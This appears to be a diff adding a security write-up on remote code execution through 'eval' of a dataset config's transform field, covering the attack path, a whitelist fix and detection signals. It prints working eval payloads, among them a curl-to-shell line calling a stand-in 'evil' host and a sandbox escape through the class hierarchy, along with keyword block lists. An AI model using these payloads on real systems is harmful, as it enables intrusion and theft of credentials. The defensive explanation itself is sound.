@@ -1,0 +1,80 @@
+# RCE via `eval(config['transform'])` — Path and Defense
+
+## 1. The vulnerable line
+
+```python
+def load_dataset(cfg):
+    ds = MyDataset(cfg['path'])
+    ds.transform = eval(cfg['transform'])   # <-- attacker-controlled
+    return ds
+```
+
+`eval` parses its argument as a **Python expression** and executes it in the current interpreter. Anything that can be expressed as an expression — including calls, attribute access, comprehensions, lambdas — runs with the loader's privileges.
+
+## 2. The remote-code-execution path
+
+**Step 1 — Attacker controls the field.** The `transform` value arrives from wherever config is loaded: a JSON/YAML file downloaded from a model hub, a job-queue message, an HTTP API body, a dataset card's `metadata.json`, an environment variable, etc. That is the "remote" in RCE.
+
+**Step 2 — Attacker crafts a payload.** `eval` needs an *expression*, but expressions are enough to run arbitrary code. Classic shapes:
+
+```python
+# Direct call
+"__import__('os').system('curl http://evil/x.sh | sh')"
+
+# Read a builtin through the call stack when __builtins__ is restricted
+"[c for c in ().__class__.__base__.__subclasses__() "
+ " if c.__name__=='_wrap_close'][0].__init__.__globals__['system']('id')"
+
+# File-write primitive, then import
+"open('/tmp/p.py','w').write(__import__('base64').b64decode('...').decode()) "
+"or __import__('importlib').import_module('/tmp/p')"
+```
+
+A very common stealth variant is to return a *function object* (so `ds.transform` looks legitimate) whose body does the damage:
+
+```python
+"(lambda x: (__import__('os').system('id'), x)[1])"
+```
+
+**Step 3 — Execution.** `eval` runs the payload in the loader process. Because the loader routinely runs with network access and often with access to dataset caches, model credentials, cloud storage keys, and the user's home directory, a single config string gives the attacker the loader's entire authority: read/write files, exfiltrate secrets, pivot to internal services, or establish persistence.
+
+**Step 4 — Blast radius.** If the loader is a daemon, batch job, or notebook backend that other users submit to, the attacker escalates from "one dataset config" to "arbitrary code as the loader user."
+
+## 3. Why `eval` is the wrong tool here
+
+`eval` is *expressions*, and expressions include **calls**. There is no safe way to sandbox `eval` from inside Python — `__builtins__` can be reached via the class hierarchy in a handful of steps, as shown above. Restricting builtins is a mitigation, not a fix.
+
+## 4. Correct fix at the source
+
+Replace `eval` with a **whitelist of named transforms**:
+
+```python
+TRANSFORMS = {
+    "resize": Resize,
+    "normalize": Normalize,
+    "to_tensor": ToTensor,
+}
+
+def load_dataset(cfg):
+    name = cfg.get("transform")
+    if name not in TRANSFORMS:
+        raise ValueError(f"unknown transform: {name!r}")
+    ds = MyDataset(cfg["path"])
+    ds.transform = TRANSFORMS[name]()
+    return ds
+```
+
+If parameters are needed, accept a *typed spec* (`{"name": "resize", "size": [224,224]}`) and validate it with a schema (pydantic, jsonschema, dataclass). Never accept callable Python source. If cross-process isolation is unavoidable, run the loader in a container/VM with no host secrets, read-only FS outside the dataset cache, and an egress firewall.
+
+## 5. Detection — what a defender looks for
+
+**Static / config-time**
+
+- Schema-validate `transform`: it must be a string that is a key in the transform registry. Reject anything containing `(`, `.`, `__`, `import`, `lambda`, `exec`, or non-identifier characters.
+- Lint and CI rules: grep for `eval(`, `exec(`, `compile(`, `getattr(` on config strings; flag any loader that passes a config field into `eval`.
+- Secret/PII scanning of uploaded configs and dataset cards before they enter the hub or queue.
+
+**Runtime**
+
+- **Process behavior**: loader process forking `sh`/`bash`/`curl`/`wget`, or making outbound DNS/HTTP to unknown hosts.
+- **Filesystem**: writes to `/tmp`, `~/.ssh`, `~/.aws`,
